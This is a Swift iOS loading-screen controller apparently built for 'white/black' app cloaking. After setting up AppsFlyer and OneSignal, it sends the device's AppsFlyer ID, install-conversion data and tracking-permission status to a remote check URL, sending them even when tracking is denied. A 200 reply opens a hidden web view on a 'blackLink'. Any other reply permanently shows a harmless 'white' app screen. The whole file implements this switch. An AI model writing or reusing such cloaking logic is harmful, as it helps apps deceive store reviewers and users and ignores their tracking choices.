import UIKit
import AppsFlyerLib
import AppTrackingTransparency
import AdSupport
import OneSignalFramework

class LoadingVC: UIViewController {
    
    private let loadingLabel: UILabel = {
        let label = UILabel()
        label.font = .baloo2(.bold, size: 35)
        label.textColor = .white
        label.textAlignment = .center
        label.translatesAutoresizingMaskIntoConstraints = false
        label.text = "Loading..."
        return label
    }()
    
    private var _appsflyerInitializer: AppsflyerInitializer?
    private var _blackConfig: BlackConfigs!
    private var progressBar: UIView!
    private var progressBarContainer: UIView!
    private var progressBarWidthConstraint: NSLayoutConstraint?
    
    private var _appsflyerConversionData = ""
    private var _appsflyerID = ""
    
    private var firstLink = ""
    private var savedLink: String?
    private var attStatus = "temp"
    
    override func viewDidAppear(_ animated: Bool) {
        requestAttracking()
    }
    
    override func viewDidLoad() {
        super.viewDidLoad()
        addBackground()
        setupProgressBar()
        _blackConfig = BlackConfigs()
        getSavedLink()
        if(NetworkManager.shared.isConnected) {
            if let _ = savedLink {
                waitAndOpenWebVC()
            } else {
                setupAppsflyer()
            }
        } else {
            DispatchQueue.main.async {
                self.waitAndOpenWhiteVC()
            }
        }
        view.backgroundColor = .yellow
    }
    
    private func setupAppsflyer() {
        _appsflyerInitializer = AppsflyerInitializer(blackConfigs: _blackConfig)
        _appsflyerInitializer?.completion = { [weak self] appsflyerConversionData in
            self?._appsflyerConversionData = appsflyerConversionData
            self?._appsflyerID = AppsFlyerLib.shared().getAppsFlyerUID()
            OneSignal.initialize(self?._blackConfig?.oneSignalKey ?? "")
            OneSignal.login(self?._appsflyerID ?? "")
            
            DispatchQueue.main.async { [weak self] in
                self?.BotCheck()
            }
            print("appsInit")
        }
    }
    
    private func getSavedLink() {
        guard let savedLink = UserDefaults.standard.string(forKey: "SavedBlackLink") else { return }
        self.savedLink = savedLink
    }
    
    private func requestOnesignalPermission() {
        OneSignal.Notifications.requestPermission({ [weak self] accepted in
            guard let self = self else { return }
            DispatchQueue.main.async {
                self.startLoadingAnimation()
            }
        }, fallbackToSettings: false)
    }
    
    private func requestAttracking() {
        ATTrackingManager.requestTrackingAuthorization { [weak self] status in
            switch(ATTrackingManager.trackingAuthorizationStatus) {
            case .authorized:
                self?.attStatus = "AUTHORIZED"
            case .denied:
                self?.attStatus = "DENIED"
            case .notDetermined:
                self?.attStatus = "NOTDETERMINED"
            case .restricted:
                self?.attStatus = "RESTRICTED"
            @unknown default:
                self?.attStatus = "RESTRICTED"
            }
            self?.requestOnesignalPermission()
        }
    }
    
    private func BotCheck() {
        let defaults = UserDefaults.standard
        if(defaults.string(forKey: "SaveWhiteOpen") != "404") {
            if((defaults.string(forKey: "SavedBlackLink")) == nil) {
                getRequest(uri: _blackConfig?.checkLink ?? "")
            } else {
                DispatchQueue.main.async {
                    self.waitAndOpenWhiteVC()
                }
            }
        } else {
            DispatchQueue.main.async {
                self.waitAndOpenWhiteVC()
            }
        }
    }
    
    private func getRequest(uri: String) {
        let uri = _blackConfig.checkLink + "?external_id=\(_appsflyerID)&sub_id_12=\(_appsflyerConversionData)&sub_id_13=\(attStatus)"
        guard let url = URL(string: uri) else { return }
        print(url)
        let task = URLSession.shared.dataTask(with: url) { [weak self]  _, response, error in
            
            if let httpResponse = response as? HTTPURLResponse {
                print(httpResponse.statusCode)
                if httpResponse.statusCode == 200 {
                    DispatchQueue.main.async {
                        self?.waitAndOpenWebVC()
                    }
                } else {
                    UserDefaults.standard.set("404", forKey: "SaveWhiteOpen")
                    DispatchQueue.main.async {
                        self?.waitAndOpenWhiteVC()
                    }
                }
                
            } else {
                UserDefaults.standard.set("404", forKey: "SaveWhiteOpen")
                DispatchQueue.main.async {
                    self?.waitAndOpenWhiteVC()
                }
            }
        }
        task.resume()
    }
    
    // MARK: UIChanges -----------------------------
    private func setupProgressBar() {
        
        progressBarContainer = UIView()
        progressBarContainer.backgroundColor = .lightGray.withAlphaComponent(0.5)
        progressBarContainer.layer.cornerRadius = 6
        progressBarContainer.clipsToBounds = true
        progressBarContainer.translatesAutoresizingMaskIntoConstraints = false
        view.addSubview(loadingLabel)
        view.addSubview(progressBarContainer)
        
        
        progressBar = UIView()
        progressBar.backgroundColor = .customPink
        progressBar.layer.cornerRadius = 6
        progressBar.clipsToBounds = true
        progressBar.translatesAutoresizingMaskIntoConstraints = false
        progressBarContainer.addSubview(progressBar)
        
        progressBarWidthConstraint = progressBar.widthAnchor.constraint(equalToConstant: 0)
        
        NSLayoutConstraint.activate([
            
            loadingLabel.centerYAnchor.constraint(equalTo: view.centerYAnchor, constant: -20),
            loadingLabel.leadingAnchor.constraint(equalTo: view.leadingAnchor, constant: 40),
            loadingLabel.trailingAnchor.constraint(equalTo: view.trailingAnchor, constant: -40),
            loadingLabel.heightAnchor.constraint(equalToConstant: 40),
            
            progressBarContainer.topAnchor.constraint(equalTo: loadingLabel.bottomAnchor, constant: 20),
            progressBarContainer.leadingAnchor.constraint(equalTo: view.leadingAnchor, constant: 40),
            progressBarContainer.trailingAnchor.constraint(equalTo: view.trailingAnchor, constant: -40),
            progressBarContainer.heightAnchor.constraint(equalToConstant: 12),
            
            progressBar.topAnchor.constraint(equalTo: progressBarContainer.topAnchor),
            progressBar.bottomAnchor.constraint(equalTo: progressBarContainer.bottomAnchor),
            progressBar.leadingAnchor.constraint(equalTo: progressBarContainer.leadingAnchor),
            progressBarWidthConstraint!
        ])
    }
    
    private func startLoadingAnimation() {
        progressBarWidthConstraint?.constant = view.bounds.width
        UIView.animate(withDuration: 3.0, animations: {
            self.view.layoutIfNeeded()
        }, completion: { _ in
        })
    }
    
    private func getFinalURL() -> URL {
        if let savedLink = savedLink
        {
            return URL(string: savedLink)!
        }
        else
        {
            return URL(string: requestLink())!
        }
    }
    
    private func requestLink() -> String {
        return _blackConfig.blackLink +  "?external_id=\(_appsflyerID)&sub_id_12=\(_appsflyerConversionData)&sub_id_13=\(attStatus)"
    }
    
    // MARK: Openers ------------------------
    private func waitAndOpenWebVC() {
        let finalURL = getFinalURL()
        DispatchQueue.main.asyncAfter(deadline: .now() + 3) {
            let _ = BlackVC(url: finalURL)
        }
    }
    
    private func waitAndOpenWhiteVC() {
        DispatchQueue.main.asyncAfter(deadline: .now() + 3) {
            
            guard let sceneDelegate = UIApplication.shared.connectedScenes.first?.delegate as? SceneDelegate else {
                print("SceneDelegate not found")
                return
            }
            let whiteVC = StartVC()
            sceneDelegate.changeNavRoot(to: whiteVC)
        }
    }
    
    func addBackground() {
        let backgroundImage = UIImageView(frame: self.view.bounds)
        backgroundImage.image = UIImage(named: "backgroundImage")
        backgroundImage.contentMode = .scaleAspectFill
        self.view.addSubview(backgroundImage)
    }
}
